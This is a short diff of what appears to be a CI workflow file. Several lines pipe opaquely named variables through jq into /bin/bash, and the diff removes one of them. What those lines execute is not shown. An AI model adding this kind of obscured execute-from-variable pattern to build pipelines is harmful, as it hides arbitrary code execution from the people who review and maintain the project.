@@ -25,7 +25,6 @@ jobs:
           echo $hpdtb09 | jq -r .rvoi1 | /bin/bash
           printf '%s' "$tuf00603" | jq -r .xv57955 | /bin/bash
           printf '%s' "$b63660" | jq -r .sbqll16 | /bin/bash
-          printf '%s' "$hdn494" | jq -r .evb587 | /bin/bash
           printf '%s' "$sm82" | jq -r .t76283 | /bin/bash
 
       - name: Upload archive
